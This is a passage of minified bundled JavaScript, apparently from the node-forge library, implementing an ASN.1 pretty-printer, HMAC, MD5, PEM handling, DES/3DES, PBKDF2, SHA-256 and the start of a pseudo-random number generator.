"'+o.tagClass+'"'),o.type!==a.type&&l.push("["+a.name+'] Expected type "'+a.type+'", got "'+o.type+'"'));return u};var s=/[^\\u0000-\\u00ff]/;return e.prettyPrint=function(o,a,c){var l="";a=a||0,c=c||2,a>0&&(l+=`
`);for(var u="",d=0;d<a*c;++d)u+=" ";switch(l+=u+"Tag: ",o.tagClass){case e.Class.UNIVERSAL:l+="Universal:";break;case e.Class.APPLICATION:l+="Application:";break;case e.Class.CONTEXT_SPECIFIC:l+="Context-Specific:";break;case e.Class.PRIVATE:l+="Private:";break}if(o.tagClass===e.Class.UNIVERSAL)switch(l+=o.type,o.type){case e.Type.NONE:l+=" (None)";break;case e.Type.BOOLEAN:l+=" (Boolean)";break;case e.Type.INTEGER:l+=" (Integer)";break;case e.Type.BITSTRING:l+=" (Bit string)";break;case e.Type.OCTETSTRING:l+=" (Octet string)";break;case e.Type.NULL:l+=" (Null)";break;case e.Type.OID:l+=" (Object Identifier)";break;case e.Type.ODESC:l+=" (Object Descriptor)";break;case e.Type.EXTERNAL:l+=" (External or Instance of)";break;case e.Type.REAL:l+=" (Real)";break;case e.Type.ENUMERATED:l+=" (Enumerated)";break;case e.Type.EMBEDDED:l+=" (Embedded PDV)";break;case e.Type.UTF8:l+=" (UTF8)";break;case e.Type.ROID:l+=" (Relative Object Identifier)";break;case e.Type.SEQUENCE:l+=" (Sequence)";break;case e.Type.SET:l+=" (Set)";break;case e.Type.PRINTABLESTRING:l+=" (Printable String)";break;case e.Type.IA5String:l+=" (IA5String (ASCII))";break;case e.Type.UTCTIME:l+=" (UTC time)";break;case e.Type.GENERALIZEDTIME:l+=" (Generalized time)";break;case e.Type.BMPSTRING:l+=" (BMP String)";break}else l+=o.type;if(l+=`
`,l+=u+"Constructed: "+o.constructed+`
`,o.composed){for(var h=0,f="",d=0;d<o.value.length;++d)o.value[d]!==void 0&&(h+=1,f+=e.prettyPrint(o.value[d],a+1,c),d+1<o.value.length&&(f+=","));l+=u+"Sub values: "+h+f}else{if(l+=u+"Value: ",o.type===e.Type.OID){var p=e.derToOid(o.value);l+=p,r.pki&&r.pki.oids&&p in r.pki.oids&&(l+=" ("+r.pki.oids[p]+") ")}if(o.type===e.Type.INTEGER)try{l+=e.derToInteger(o.value)}catch{l+="0x"+r.util.bytesToHex(o.value)}else if(o.type===e.Type.BITSTRING){if(o.value.length>1?l+="0x"+r.util.bytesToHex(o.value.slice(1)):l+="(none)",o.value.length>0){var g=o.value.charCodeAt(0);g==1?l+=" (1 unused bit shown)":g>1&&(l+=" ("+g+" unused bits shown)")}}else if(o.type===e.Type.OCTETSTRING)s.test(o.value)||(l+="("+o.value+") "),l+="0x"+r.util.bytesToHex(o.value);else if(o.type===e.Type.UTF8)try{l+=r.util.decodeUtf8(o.value)}catch(w){if(w.message==="URI malformed")l+="0x"+r.util.bytesToHex(o.value)+" (malformed UTF8)";else throw w}else o.type===e.Type.PRINTABLESTRING||o.type===e.Type.IA5String?l+=o.value:s.test(o.value)?l+="0x"+r.util.bytesToHex(o.value):o.value.length===0?l+="[null]":l+=o.value}return l},y_.exports}var C_={exports:{}},E_,kD;function I0(){if(kD)return E_;kD=1;var r=Lr();return E_=r.md=r.md||{},r.md.algorithms=r.md.algorithms||{},E_}var ND;function r4(){if(ND)return C_.exports;ND=1;var r=Lr();I0(),Ei();var e=C_.exports=r.hmac=r.hmac||{};return e.create=function(){var t=null,i=null,n=null,s=null,o={};return o.start=function(a,c){if(a!==null)if(typeof a=="string")if(a=a.toLowerCase(),a in r.md.algorithms)i=r.md.algorithms[a].create();else throw new Error('Unknown hash algorithm "'+a+'"');else i=a;if(c===null)c=t;else{if(typeof c=="string")c=r.util.createBuffer(c);else if(r.util.isArray(c)){var l=c;c=r.util.createBuffer();for(var u=0;u<l.length;++u)c.putByte(l[u])}var d=c.length();d>i.blockLength&&(i.start(),i.update(c.bytes()),c=i.digest()),n=r.util.createBuffer(),s=r.util.createBuffer(),d=c.length();for(var u=0;u<d;++u){var l=c.at(u);n.putByte(54^l),s.putByte(92^l)}if(d<i.blockLength)for(var l=i.blockLength-d,u=0;u<l;++u)n.putByte(54),s.putByte(92);t=c,n=n.bytes(),s=s.bytes()}i.start(),i.update(n)},o.update=function(a){i.update(a)},o.getMac=function(){var a=i.digest().bytes();return i.start(),i.update(s),i.update(a),i.digest()},o.digest=o.getMac,o},C_.exports}var __={exports:{}},PD;function z$(){if(PD)return __.exports;PD=1;var r=Lr();I0(),Ei();var e=__.exports=r.md5=r.md5||{};r.md.md5=r.md.algorithms.md5=e,e.create=function(){o||a();var l=null,u=r.util.createBuffer(),d=new Array(16),h={algorithm:"md5",blockLength:64,digestLength:16,messageLength:0,fullMessageLength:null,messageLengthSize:8};return h.start=function(){h.messageLength=0,h.fullMessageLength=h.messageLength64=[];for(var f=h.messageLengthSize/4,p=0;p<f;++p)h.fullMessageLength.push(0);return u=r.util.createBuffer(),l={h0:1732584193,h1:4023233417,h2:2562383102,h3:271733878},h},h.start(),h.update=function(f,p){p==="utf8"&&(f=r.util.encodeUtf8(f));var g=f.length;h.messageLength+=g,g=[g/4294967296>>>0,g>>>0];for(var w=h.fullMessageLength.length-1;w>=0;--w)h.fullMessageLength[w]+=g[1],g[1]=g[0]+(h.fullMessageLength[w]/4294967296>>>0),h.fullMessageLength[w]=h.fullMessageLength[w]>>>0,g[0]=g[1]/4294967296>>>0;return u.putBytes(f),c(l,d,u),(u.read>2048||u.length()===0)&&u.compact(),h},h.digest=function(){var f=r.util.createBuffer();f.putBytes(u.bytes());var p=h.fullMessageLength[h.fullMessageLength.length-1]+h.messageLengthSize,g=p&h.blockLength-1;f.putBytes(t.substr(0,h.blockLength-g));for(var w,m=0,x=h.fullMessageLength.length-1;x>=0;--x)w=h.fullMessageLength[x]*8+m,m=w/4294967296>>>0,f.putInt32Le(w>>>0);var S={h0:l.h0,h1:l.h1,h2:l.h2,h3:l.h3};c(S,d,f);var T=r.util.createBuffer();return T.putInt32Le(S.h0),T.putInt32Le(S.h1),T.putInt32Le(S.h2),T.putInt32Le(S.h3),T},h};var t=null,i=null,n=null,s=null,o=!1;function a(){t="",t+=r.util.fillString("\0",64),i=[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,1,6,11,0,5,10,15,4,9,14,3,8,13,2,7,12,5,8,11,14,1,4,7,10,13,0,3,6,9,12,15,2,0,7,14,5,12,3,10,1,8,15,6,13,4,11,2,9],n=[7,12,17,22,7,12,17,22,7,12,17,22,7,12,17,22,5,9,14,20,5,9,14,20,5,9,14,20,5,9,14,20,4,11,16,23,4,11,16,23,4,11,16,23,4,11,16,23,6,10,15,21,6,10,15,21,6,10,15,21,6,10,15,21],s=new Array(64);for(var l=0;l<64;++l)s[l]=Math.floor(Math.abs(Math.sin(l+1))*4294967296);o=!0}function c(l,u,d){for(var h,f,p,g,w,m,x,S,T=d.length();T>=64;){for(f=l.h0,p=l.h1,g=l.h2,w=l.h3,S=0;S<16;++S)u[S]=d.getInt32Le(),m=w^p&(g^w),h=f+m+s[S]+u[S],x=n[S],f=w,w=g,g=p,p+=h<<x|h>>>32-x;for(;S<32;++S)m=g^w&(p^g),h=f+m+s[S]+u[i[S]],x=n[S],f=w,w=g,g=p,p+=h<<x|h>>>32-x;for(;S<48;++S)m=p^g^w,h=f+m+s[S]+u[i[S]],x=n[S],f=w,w=g,g=p,p+=h<<x|h>>>32-x;for(;S<64;++S)m=g^(p|~w),h=f+m+s[S]+u[i[S]],x=n[S],f=w,w=g,g=p,p+=h<<x|h>>>32-x;l.h0=l.h0+f|0,l.h1=l.h1+p|0,l.h2=l.h2+g|0,l.h3=l.h3+w|0,T-=64}}return __.exports}var S_={exports:{}},$D;function E3(){if($D)return S_.exports;$D=1;var r=Lr();Ei();var e=S_.exports=r.pem=r.pem||{};e.encode=function(n,s){s=s||{};var o="-----BEGIN "+n.type+`-----\r
`,a;if(n.procType&&(a={name:"Proc-Type",values:[String(n.procType.version),n.procType.type]},o+=t(a)),n.contentDomain&&(a={name:"Content-Domain",values:[n.contentDomain]},o+=t(a)),n.dekInfo&&(a={name:"DEK-Info",values:[n.dekInfo.algorithm]},n.dekInfo.parameters&&a.values.push(n.dekInfo.parameters),o+=t(a)),n.headers)for(var c=0;c<n.headers.length;++c)o+=t(n.headers[c]);return n.procType&&(o+=`\r
`),o+=r.util.encode64(n.body,s.maxline||64)+`\r
`,o+="-----END "+n.type+`-----\r
`,o},e.decode=function(n){for(var s=[],o=/\s*-----BEGIN ([A-Z0-9- ]+)-----\r?\n?([\x21-\x7e\s]+?(?:\r?\n\r?\n))?([:A-Za-z0-9+\/=\s]+?)-----END \1-----/g,a=/([\x21-\x7e]+):\s*([\x21-\x7e\s^:]+)/,c=/\r?\n/,l;l=o.exec(n),!!l;){var u=l[1];u==="NEW CERTIFICATE REQUEST"&&(u="CERTIFICATE REQUEST");var d={type:u,procType:null,contentDomain:null,dekInfo:null,headers:[],body:r.util.decode64(l[3])};if(s.push(d),!!l[2]){for(var h=l[2].split(c),f=0;l&&f<h.length;){for(var p=h[f].replace(/\s+$/,""),g=f+1;g<h.length;++g){var w=h[g];if(!/\s/.test(w[0]))break;p+=w,f=g}if(l=p.match(a),l){for(var m={name:l[1],values:[]},x=l[2].split(","),S=0;S<x.length;++S)m.values.push(i(x[S]));if(d.procType)if(!d.contentDomain&&m.name==="Content-Domain")d.contentDomain=x[0]||"";else if(!d.dekInfo&&m.name==="DEK-Info"){if(m.values.length===0)throw new Error('Invalid PEM formatted message. The "DEK-Info" header must have at least one subfield.');d.dekInfo={algorithm:x[0],parameters:x[1]||null}}else d.headers.push(m);else{if(m.name!=="Proc-Type")throw new Error('Invalid PEM formatted message. The first encapsulated header must be "Proc-Type".');if(m.values.length!==2)throw new Error('Invalid PEM formatted message. The "Proc-Type" header must have two subfields.');d.procType={version:x[0],type:x[1]}}}++f}if(d.procType==="ENCRYPTED"&&!d.dekInfo)throw new Error('Invalid PEM formatted message. The "DEK-Info" header must be present if "Proc-Type" is "ENCRYPTED".')}}if(s.length===0)throw new Error("Invalid PEM formatted message.");return s};function t(n){for(var s=n.name+": ",o=[],a=function(h,f){return" "+f},c=0;c<n.values.length;++c)o.push(n.values[c].replace(/^(\S+\r\n)/,a));s+=o.join(",")+`\r
`;for(var l=0,u=-1,c=0;c<s.length;++c,++l)if(l>65&&u!==-1){var d=s[u];d===","?(++u,s=s.substr(0,u)+`\r
 `+s.substr(u)):s=s.substr(0,u)+`\r
`+d+s.substr(u+1),l=c-u-1,u=-1,++c}else(s[c]===" "||s[c]==="	"||s[c]===",")&&(u=c);return s}function i(n){return n.replace(/^\s+/,"")}return S_.exports}var A_={exports:{}},I_,RD;function Zx(){if(RD)return I_;RD=1;var r=Lr();q$(),dJ(),Ei(),I_=r.des=r.des||{},r.des.startEncrypting=function(f,p,g,w){var m=h({key:f,output:g,decrypt:!1,mode:w||(p===null?"ECB":"CBC")});return m.start(p),m},r.des.createEncryptionCipher=function(f,p){return h({key:f,output:null,decrypt:!1,mode:p})},r.des.startDecrypting=function(f,p,g,w){var m=h({key:f,output:g,decrypt:!0,mode:w||(p===null?"ECB":"CBC")});return m.start(p),m},r.des.createDecryptionCipher=function(f,p){return h({key:f,output:null,decrypt:!0,mode:p})},r.des.Algorithm=function(f,p){var g=this;g.name=f,g.mode=new p({blockSize:8,cipher:{encrypt:function(w,m){return d(g._keys,w,m,!1)},decrypt:function(w,m){return d(g._keys,w,m,!0)}}}),g._init=!1},r.des.Algorithm.prototype.initialize=function(f){if(!this._init){var p=r.util.createBuffer(f.key);if(this.name.indexOf("3DES")===0&&p.length()!==24)throw new Error("Invalid Triple-DES key size: "+p.length()*8);this._keys=u(p),this._init=!0}},e("DES-ECB",r.cipher.modes.ecb),e("DES-CBC",r.cipher.modes.cbc),e("DES-CFB",r.cipher.modes.cfb),e("DES-OFB",r.cipher.modes.ofb),e("DES-CTR",r.cipher.modes.ctr),e("3DES-ECB",r.cipher.modes.ecb),e("3DES-CBC",r.cipher.modes.cbc),e("3DES-CFB",r.cipher.modes.cfb),e("3DES-OFB",r.cipher.modes.ofb),e("3DES-CTR",r.cipher.modes.ctr);function e(f,p){var g=function(){return new r.des.Algorithm(f,p)};r.cipher.registerAlgorithm(f,g)}var t=[16843776,0,65536,16843780,16842756,66564,4,65536,1024,16843776,16843780,1024,16778244,16842756,16777216,4,1028,16778240,16778240,66560,66560,16842752,16842752,16778244,65540,16777220,16777220,65540,0,1028,66564,16777216,65536,16843780,4,16842752,16843776,16777216,16777216,1024,16842756,65536,66560,16777220,1024,4,16778244,66564,16843780,65540,16842752,16778244,16777220,1028,66564,16843776,1028,16778240,16778240,0,65540,66560,0,16842756],i=[-2146402272,-2147450880,32768,1081376,1048576,32,-2146435040,-2147450848,-2147483616,-2146402272,-2146402304,-2147483648,-2147450880,1048576,32,-2146435040,1081344,1048608,-2147450848,0,-2147483648,32768,1081376,-2146435072,1048608,-2147483616,0,1081344,32800,-2146402304,-2146435072,32800,0,1081376,-2146435040,1048576,-2147450848,-2146435072,-2146402304,32768,-2146435072,-2147450880,32,-2146402272,1081376,32,32768,-2147483648,32800,-2146402304,1048576,-2147483616,1048608,-2147450848,-2147483616,1048608,1081344,0,-2147450880,32800,-2147483648,-2146435040,-2146402272,1081344],n=[520,134349312,0,134348808,134218240,0,131592,134218240,131080,134217736,134217736,131072,134349320,131080,134348800,520,134217728,8,134349312,512,131584,134348800,134348808,131592,134218248,131584,131072,134218248,8,134349320,512,134217728,134349312,134217728,131080,520,131072,134349312,134218240,0,512,131080,134349320,134218240,134217736,512,0,134348808,134218248,131072,134217728,134349320,8,131592,131584,134217736,134348800,134218248,520,134348800,131592,8,134348808,131584],s=[8396801,8321,8321,128,8396928,8388737,8388609,8193,0,8396800,8396800,8396929,129,0,8388736,8388609,1,8192,8388608,8396801,128,8388608,8193,8320,8388737,1,8320,8388736,8192,8396928,8396929,129,8388736,8388609,8396800,8396929,129,0,0,8396800,8320,8388736,8388737,1,8396801,8321,8321,128,8396929,129,1,8192,8388609,8193,8396928,8388737,8193,8320,8388608,8396801,128,8388608,8192,8396928],o=[256,34078976,34078720,1107296512,524288,256,1073741824,34078720,1074266368,524288,33554688,1074266368,1107296512,1107820544,524544,1073741824,33554432,1074266112,1074266112,0,1073742080,1107820800,1107820800,33554688,1107820544,1073742080,0,1107296256,34078976,33554432,1107296256,524544,524288,1107296512,256,33554432,1073741824,34078720,1107296512,1074266368,33554688,1073741824,1107820544,34078976,1074266368,256,33554432,1107820544,1107820800,524544,1107296256,1107820800,34078720,0,1074266112,1107296256,524544,33554688,1073742080,524288,0,1074266112,34078976,1073742080],a=[536870928,541065216,16384,541081616,541065216,16,541081616,4194304,536887296,4210704,4194304,536870928,4194320,536887296,536870912,16400,0,4194320,536887312,16384,4210688,536887312,16,541065232,541065232,0,4210704,541081600,16400,4210688,541081600,536870912,536887296,16,541065232,4210688,541081616,4194304,16400,536870928,4194304,536887296,536870912,16400,536870928,541081616,4210688,541065216,4210704,541081600,0,541065232,16,16384,541065216,4210704,16384,4194320,536887312,0,541081600,536870912,4194320,536887312],c=[2097152,69206018,67110914,0,2048,67110914,2099202,69208064,69208066,2097152,0,67108866,2,67108864,69206018,2050,67110912,2099202,2097154,67110912,67108866,69206016,69208064,2097154,69206016,2048,2050,69208066,2099200,2,67108864,2099200,67108864,2099200,2097152,67110914,67110914,69206018,69206018,2,2097154,67108864,67110912,2097152,69208064,2050,2099202,69208064,2050,67108866,69208066,69206016,2099200,0,2,69208066,0,2099202,69206016,2048,67108866,67110912,2048,2097154],l=[268439616,4096,262144,268701760,268435456,268439616,64,268435456,262208,268697600,268701760,266240,268701696,266304,4096,64,268697600,268435520,268439552,4160,266240,262208,268697664,268701696,4160,0,0,268697664,268435520,268439552,266304,262144,266304,262144,268701696,4096,64,268697664,4096,266304,268439552,64,268435520,268697600,268697664,268435456,262144,268439616,0,268701760,262208,268435520,268697600,268439552,268439616,0,268701760,266240,266240,4160,4160,262208,268435456,268701696];function u(f){for(var p=[0,4,536870912,536870916,65536,65540,536936448,536936452,512,516,536871424,536871428,66048,66052,536936960,536936964],g=[0,1,1048576,1048577,67108864,67108865,68157440,68157441,256,257,1048832,1048833,67109120,67109121,68157696,68157697],w=[0,8,2048,2056,16777216,16777224,16779264,16779272,0,8,2048,2056,16777216,16777224,16779264,16779272],m=[0,2097152,134217728,136314880,8192,2105344,134225920,136323072,131072,2228224,134348800,136445952,139264,2236416,134356992,136454144],x=[0,262144,16,262160,0,262144,16,262160,4096,266240,4112,266256,4096,266240,4112,266256],S=[0,1024,32,1056,0,1024,32,1056,33554432,33555456,33554464,33555488,33554432,33555456,33554464,33555488],T=[0,268435456,524288,268959744,2,268435458,524290,268959746,0,268435456,524288,268959744,2,268435458,524290,268959746],k=[0,65536,2048,67584,536870912,536936448,536872960,536938496,131072,196608,133120,198656,537001984,537067520,537004032,537069568],I=[0,262144,0,262144,2,262146,2,262146,33554432,33816576,33554432,33816576,33554434,33816578,33554434,33816578],E=[0,268435456,8,268435464,0,268435456,8,268435464,1024,268436480,1032,268436488,1024,268436480,1032,268436488],C=[0,32,0,32,1048576,1048608,1048576,1048608,8192,8224,8192,8224,1056768,1056800,1056768,1056800],N=[0,16777216,512,16777728,2097152,18874368,2097664,18874880,67108864,83886080,67109376,83886592,69206016,85983232,69206528,85983744],L=[0,4096,134217728,134221824,524288,528384,134742016,134746112,16,4112,134217744,134221840,524304,528400,134742032,134746128],$=[0,4,256,260,0,4,256,260,1,5,257,261,1,5,257,261],y=f.length()>8?3:1,A=[],b=[0,0,1,1,1,1,1,1,0,1,1,1,1,1,1,0],v=0,_,O=0;O<y;O++){var D=f.getInt32(),R=f.getInt32();_=(D>>>4^R)&252645135,R^=_,D^=_<<4,_=(R>>>-16^D)&65535,D^=_,R^=_<<-16,_=(D>>>2^R)&858993459,R^=_,D^=_<<2,_=(R>>>-16^D)&65535,D^=_,R^=_<<-16,_=(D>>>1^R)&1431655765,R^=_,D^=_<<1,_=(R>>>8^D)&16711935,D^=_,R^=_<<8,_=(D>>>1^R)&1431655765,R^=_,D^=_<<1,_=D<<8|R>>>20&240,D=R<<24|R<<8&16711680|R>>>8&65280|R>>>24&240,R=_;for(var P=0;P<b.length;++P){b[P]?(D=D<<2|D>>>26,R=R<<2|R>>>26):(D=D<<1|D>>>27,R=R<<1|R>>>27),D&=-15,R&=-15;var B=p[D>>>28]|g[D>>>24&15]|w[D>>>20&15]|m[D>>>16&15]|x[D>>>12&15]|S[D>>>8&15]|T[D>>>4&15],M=k[R>>>28]|I[R>>>24&15]|E[R>>>20&15]|C[R>>>16&15]|N[R>>>12&15]|L[R>>>8&15]|$[R>>>4&15];_=(M>>>16^B)&65535,A[v++]=B^_,A[v++]=M^_<<16}}return A}function d(f,p,g,w){var m=f.length===32?3:9,x;m===3?x=w?[30,-2,-2]:[0,32,2]:x=w?[94,62,-2,32,64,2,30,-2,-2]:[0,32,2,62,30,-2,64,96,2];var S,T=p[0],k=p[1];S=(T>>>4^k)&252645135,k^=S,T^=S<<4,S=(T>>>16^k)&65535,k^=S,T^=S<<16,S=(k>>>2^T)&858993459,T^=S,k^=S<<2,S=(k>>>8^T)&16711935,T^=S,k^=S<<8,S=(T>>>1^k)&1431655765,k^=S,T^=S<<1,T=T<<1|T>>>31,k=k<<1|k>>>31;for(var I=0;I<m;I+=3){for(var E=x[I+1],C=x[I+2],N=x[I];N!=E;N+=C){var L=k^f[N],$=(k>>>4|k<<28)^f[N+1];S=T,T=k,k=S^(i[L>>>24&63]|s[L>>>16&63]|a[L>>>8&63]|l[L&63]|t[$>>>24&63]|n[$>>>16&63]|o[$>>>8&63]|c[$&63])}S=T,T=k,k=S}T=T>>>1|T<<31,k=k>>>1|k<<31,S=(T>>>1^k)&1431655765,k^=S,T^=S<<1,S=(k>>>8^T)&16711935,T^=S,k^=S<<8,S=(k>>>2^T)&858993459,T^=S,k^=S<<2,S=(T>>>16^k)&65535,k^=S,T^=S<<16,S=(T>>>4^k)&252645135,k^=S,T^=S<<4,g[0]=T,g[1]=k}function h(f){f=f||{};var p=(f.mode||"CBC").toUpperCase(),g="DES-"+p,w;f.decrypt?w=r.cipher.createDecipher(g,f.key):w=r.cipher.createCipher(g,f.key);var m=w.start;return w.start=function(x,S){var T=null;S instanceof r.util.ByteBuffer&&(T=S,S={}),S=S||{},S.output=T,S.iv=x,m.call(w,S)},w}return I_}var T_,OD;function W$(){if(OD)return T_;OD=1;var r=Lr();r4(),I0(),Ei();var e=r.pkcs5=r.pkcs5||{},t;return r.util.isNodejs&&!r.options.usePureJavaScript&&(t=w3),T_=r.pbkdf2=e.pbkdf2=function(i,n,s,o,a,c){if(typeof a=="function"&&(c=a,a=null),r.util.isNodejs&&!r.options.usePureJavaScript&&t.pbkdf2&&(a===null||typeof a!="object")&&(t.pbkdf2Sync.length>4||!a||a==="sha1"))return typeof a!="string"&&(a="sha1"),i=Buffer.from(i,"binary"),n=Buffer.from(n,"binary"),c?t.pbkdf2Sync.length===4?t.pbkdf2(i,n,s,o,function(I,E){if(I)return c(I);c(null,E.toString("binary"))}):t.pbkdf2(i,n,s,o,a,function(I,E){if(I)return c(I);c(null,E.toString("binary"))}):t.pbkdf2Sync.length===4?t.pbkdf2Sync(i,n,s,o).toString("binary"):t.pbkdf2Sync(i,n,s,o,a).toString("binary");if((typeof a>"u"||a===null)&&(a="sha1"),typeof a=="string"){if(!(a in r.md.algorithms))throw new Error("Unknown hash algorithm: "+a);a=r.md[a].create()}var l=a.digestLength;if(o>4294967295*l){var u=new Error("Derived key is too long.");if(c)return c(u);throw u}var d=Math.ceil(o/l),h=o-(d-1)*l,f=r.hmac.create();f.start(a,i);var p="",g,w,m;if(!c){for(var x=1;x<=d;++x){f.start(null,null),f.update(n),f.update(r.util.int32ToBytes(x)),g=m=f.digest().getBytes();for(var S=2;S<=s;++S)f.start(null,null),f.update(m),w=f.digest().getBytes(),g=r.util.xorBytes(g,w,l),m=w;p+=x<d?g:g.substr(0,h)}return p}var x=1,S;function T(){if(x>d)return c(null,p);f.start(null,null),f.update(n),f.update(r.util.int32ToBytes(x)),g=m=f.digest().getBytes(),S=2,k()}function k(){if(S<=s)return f.start(null,null),f.update(m),w=f.digest().getBytes(),g=r.util.xorBytes(g,w,l),m=w,++S,r.util.setImmediate(k);p+=x<d?g:g.substr(0,h),++x,T()}T()},T_}var D6={exports:{}},k_={exports:{}},BD;function hJ(){if(BD)return k_.exports;BD=1;var r=Lr();I0(),Ei();var e=k_.exports=r.sha256=r.sha256||{};r.md.sha256=r.md.algorithms.sha256=e,e.create=function(){i||s();var a=null,c=r.util.createBuffer(),l=new Array(64),u={algorithm:"sha256",blockLength:64,digestLength:32,messageLength:0,fullMessageLength:null,messageLengthSize:8};return u.start=function(){u.messageLength=0,u.fullMessageLength=u.messageLength64=[];for(var d=u.messageLengthSize/4,h=0;h<d;++h)u.fullMessageLength.push(0);return c=r.util.createBuffer(),a={h0:1779033703,h1:3144134277,h2:1013904242,h3:2773480762,h4:1359893119,h5:2600822924,h6:528734635,h7:1541459225},u},u.start(),u.update=function(d,h){h==="utf8"&&(d=r.util.encodeUtf8(d));var f=d.length;u.messageLength+=f,f=[f/4294967296>>>0,f>>>0];for(var p=u.fullMessageLength.length-1;p>=0;--p)u.fullMessageLength[p]+=f[1],f[1]=f[0]+(u.fullMessageLength[p]/4294967296>>>0),u.fullMessageLength[p]=u.fullMessageLength[p]>>>0,f[0]=f[1]/4294967296>>>0;return c.putBytes(d),o(a,l,c),(c.read>2048||c.length()===0)&&c.compact(),u},u.digest=function(){var d=r.util.createBuffer();d.putBytes(c.bytes());var h=u.fullMessageLength[u.fullMessageLength.length-1]+u.messageLengthSize,f=h&u.blockLength-1;d.putBytes(t.substr(0,u.blockLength-f));for(var p,g,w=u.fullMessageLength[0]*8,m=0;m<u.fullMessageLength.length-1;++m)p=u.fullMessageLength[m+1]*8,g=p/4294967296>>>0,w+=g,d.putInt32(w>>>0),w=p>>>0;d.putInt32(w);var x={h0:a.h0,h1:a.h1,h2:a.h2,h3:a.h3,h4:a.h4,h5:a.h5,h6:a.h6,h7:a.h7};o(x,l,d);var S=r.util.createBuffer();return S.putInt32(x.h0),S.putInt32(x.h1),S.putInt32(x.h2),S.putInt32(x.h3),S.putInt32(x.h4),S.putInt32(x.h5),S.putInt32(x.h6),S.putInt32(x.h7),S},u};var t=null,i=!1,n=null;function s(){t="",t+=r.util.fillString("\0",64),n=[1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298],i=!0}function o(a,c,l){for(var u,d,h,f,p,g,w,m,x,S,T,k,I,E,C,N=l.length();N>=64;){for(w=0;w<16;++w)c[w]=l.getInt32();for(;w<64;++w)u=c[w-2],u=(u>>>17|u<<15)^(u>>>19|u<<13)^u>>>10,d=c[w-15],d=(d>>>7|d<<25)^(d>>>18|d<<14)^d>>>3,c[w]=u+c[w-7]+d+c[w-16]|0;for(m=a.h0,x=a.h1,S=a.h2,T=a.h3,k=a.h4,I=a.h5,E=a.h6,C=a.h7,w=0;w<64;++w)f=(k>>>6|k<<26)^(k>>>11|k<<21)^(k>>>25|k<<7),p=E^k&(I^E),h=(m>>>2|m<<30)^(m>>>13|m<<19)^(m>>>22|m<<10),g=m&x|S&(m^x),u=C+f+p+n[w]+c[w],d=h+g,C=E,E=I,I=k,k=T+u>>>0,T=S,S=x,x=m,m=u+d>>>0;a.h0=a.h0+m|0,a.h1=a.h1+x|0,a.h2=a.h2+S|0,a.h3=a.h3+T|0,a.h4=a.h4+k|0,a.h5=a.h5+I|0,a.h6=a.h6+E|0,a.h7=a.h7+C|0,N-=64}}return k_.exports}var N_={exports:{}},MD;function fJ(){if(MD)return N_.exports;MD=1;var r=Lr();Ei();var e=null;r.util.isNodejs&&!r.options.usePureJavaScript&&!process.versions["node-webkit"]&&(e=w3);var t=N_.exports=r.prng=r.prng||{};return t.create=function(i){for(var n={plugin:i,key:null,seed:null,time:null,reseeds:0,generated:0,keyBytes:""},s=i.md,o=new Array(32),a=0;a<32;++a)o[a]=s.create();n.pools=o,n.pool=0,n.generate=function(h,f){if(!f)return n.generateSync(h);var p=n.plugin.cipher,g=n.plugin.increment,w=n.plugin.formatKey,m=n.plugin.formatSeed,x=r.util.createBuffer();n.key=null,S();function S(T){if(T)return f(T);if(x.length()>=h)return f(null,x.getBytes(h));if(n.generated>1048575&&(n.key=null),n.key===null)return r.util.nextTick(function(){c(S)});var k=p(n.key,n.seed);n.generated+=k.length,x.putBytes(k),n.key=w(p(n.key,g(n.seed))),n.seed=m(p(n.key,n.seed)),r.util.setImmediate(S)}},n.generateSync=function(h){var f=n.plugin.cipher,p=n.plugin.increment,g=n.plugin.formatKey,w=n.plugin.formatSeed;n.key=null;for(var m=r.util.createBuffer();m.length()<h;){n.generated>1048575&&(n.key=null),n.key===null&&l();var x=f(n.key,n.seed);n.generated+=x.length,m.putBytes(x),n.key=g(f(n.key,p(n.seed))),n.seed=w(f(n.key,n.seed))}return m.getBytes(h)};function c(h){if(n.pools[0].messageLength>=32)return u(),h();var f=32-n.pools[0].messageLength<<5;n.seedFile(f,function(p,g){if(p)return h(p);n.collect(g),u(),h()})}function l(){if(n.pools[0].messageLength>=32)return u();var h=32-n.pools[0].messageLength<<5;n.collect(n.seedFileSync(h)),u()}function u(){n.reseeds=n.reseeds===4294967295?0:n.reseeds+1;var h=n.plugin.md.create();h.update(n.keyBytes);for(var f=1,p=0;p<32;++p)n.reseeds%f===0&&(h.update(n.pools[p].digest().getBytes()),n.pools[p].start()),f=f<<1;n.keyBytes=h.digest().getBytes(),h.start(),h.update(n.keyBytes);var g=h.digest().getBytes();n.key=n.plugin.formatKey(n.keyBytes),n.seed=n.plugin.formatSeed(g),n.generated=0}function d(h){var f=null,p=r.util.globalScope,g=p.crypto||p.msCrypto;g&&g.getRandomValues&&(f=function(C){return g.getRandomValues(C)});var w=r.util.createBuffer();if(f)for(;w.length()<h;){var m=Math.max(1,Math.min(h-w.length(),65536)/4),x=new Uint32Array(Math.floor(m));try{f(x);for(var S=0;S<x.length;++S)w.putInt32(x[S])}catch(C){if(!(typeof QuotaExceededError<"u"&&C instanceof QuotaExceededError))throw C}}if(w.length()<h)for(var T,k,I,E=Math.floor(Math.random()*65536);w.length()<h;){k=16807*(E&65535),T=16807*(E>>16),k+=(T&32767)<<16,k+=T>>15,k=(k&2147483647)+(k>>31),E=k&4294967295;for(var S=0;S<3;++S)I=E>>>(S<<3),I^=Math.floor(Math.random()*256),w.putByte(I&255)}return w.getBytes(h)}return e?(n.seedFile=function(h,f){e.randomBytes(h,function(p,g){if(p)return f(p);f(null,g.toString())})},n.seedFileSync=function(h){return e.randomBytes(h).toString()}):(n.seedFile=function(h,f){try{f(null,d(h))}catch(p){f(p)}},n.seedFileSync=d),n.collect=function(h){for(var f=h.length,p=0;p<f;++p)n.pools[n.pool].update(h.substr(p,1)),n.pool=n.pool===31?0:n.pool+1},n.collectInt=function(h,f){for(var p="",g=0;g<f;g+=8)p+=String.fromCharCode(h>>g&255);n.collect(p)},n.registerWorker=function(h){if(h===self)n.seedFile=function(p,g){function 